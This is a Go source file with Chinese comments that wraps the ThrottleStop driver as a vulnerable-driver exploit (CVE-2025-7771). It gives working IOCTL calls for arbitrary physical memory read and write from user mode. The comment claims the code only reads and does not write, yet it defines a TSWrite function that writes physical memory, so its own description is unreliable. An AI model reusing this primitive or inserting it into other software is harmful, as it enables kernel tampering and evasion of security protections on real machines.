package hxcore

import (
	"encoding/binary"
	"syscall"
)

// ThrottleStop BYOVD (CVE-2025-7771) — 物理内存读取通道。
//
// v2.5: 50hx_bridge 不再是 Gen2 方案的一部分(它需测试签名)。
// 诊断读取改用 TechPowerUp ThrottleStop 驱动(预签名, 普通模式可载),
// 它暴露任意物理地址读(≤8B/次)。此处只封装"读", 不写。
//
//   device: \\.\ThrottleStop
//   ioctl  0x80006498  in: <u64 physAddr>  out: ≤8B data
//   ioctl  0x8000649C  in: <u64 physAddr><data(≤8B)>
const (
	ioctlTsR = 0x80006498
	ioctlTsW = 0x8000649C
)

// TSWrite: 经 ThrottleStop 写物理地址 4 字节 (addr 需含 BAR0 基址)。
func TSWrite(th syscall.Handle, addr uint64, val uint32) error {
	ib := make([]byte, 12)
	binary.LittleEndian.PutUint64(ib, addr)
	binary.LittleEndian.PutUint32(ib[8:], val)
	if _, err := IoCtl(th, ioctlTsW, ib, nil); err != nil {
		return err
	}
	return nil
}

// TSRead: 经 ThrottleStop 读物理地址 4 字节 (addr 需含 BAR0 基址)。
func TSRead(th syscall.Handle, addr uint64) (uint32, error) {
	ib := make([]byte, 8)
	binary.LittleEndian.PutUint64(ib, addr)
	ob := make([]byte, 4)
	if _, err := IoCtl(th, ioctlTsR, ib, ob); err != nil {
		return 0, err
	}
	return binary.LittleEndian.Uint32(ob), nil
}

// OpenThrottleStop: 打开 \\.\ThrottleStop (服务须已运行/可打开)。
func OpenThrottleStop() (syscall.Handle, error) {
	return OpenDevice(`\\.\ThrottleStop`)
}
